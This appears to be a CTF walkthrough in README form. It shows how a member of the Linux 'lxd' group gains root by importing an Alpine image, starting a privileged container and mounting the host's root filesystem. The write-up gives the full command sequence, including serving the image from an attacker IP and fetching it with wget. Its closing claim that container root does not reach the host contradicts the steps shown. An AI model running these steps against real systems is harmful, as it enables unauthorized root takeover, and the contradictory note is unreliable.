# Lxd-Privilege-Escalation-in-Linux
In this writeup we will cover how a member of a local “lxd” group can instantly escalate the privileges to root on the host operating system.


This script provides a way to create [Alpine Linux](http://alpinelinux.org/)
images for their use with [LXD](https://linuxcontainers.org/lxd/).
It's based off the LXC templates.

The image will be built just by installing the `alpine-base` meta-package.
Networking and syslog are enabled by default.


## Usage

In order to build the latest Alpine image just run the script (must be done
as root):

    sudo ./build-alpine

For more options check the help:

    sudo ./build-alpine -h

After the image is built it can be added as an image to LXD as follows:

    lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --alias alpine-v3.3





## Follow the Steps in CTF:

#### First, run the id command to check whether your user belongs to the lxd group or not.
 
```
id
```

![ID](./img/id.png)
#



#### If lxd is listed, then continue.
#### Download a this Alpine Linux container image from github.
```
git clone https://github.com/zaaraZiof0/Lxd-Privilege-Escalation-in-Linux.git
```

![Git Clone](./img/gitclone.png)
#


#### Now share this image file alphine-v3.13-x86_64-20210218_0139.tar.gz to the victim machine.
```
python3 -m http.server 80
```

![Python Server](./img/server.png)
#


#### Download the image file with wget command.
```
wget 10.8.9.235/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

![Download with wget](./img/wget.png)
#


#### Now import this lxd container into lxd environment and give it an alias.
```
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
```

![fringerPrint](./img/fringer.png)
#


#### Display a list of all the images stored in the local LXD image store
```
lxc image list
```

![ALIAS](./img/alias.png)
#


#### Now run the following command one by one.
```
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

![](./img/gain.png)
#


#### Navigate to /mnt/root to access the host's filesystem with root privileges
```
cd /mnt/root
```

![flag](./img/flag.png)

#### Now here we have full control within the container.

#

### Note: Being root inside a container doesn’t automatically translate to having root access on the host system, as containers are designed to isolate processes.

#### Happy Hacking…. | ZAARA
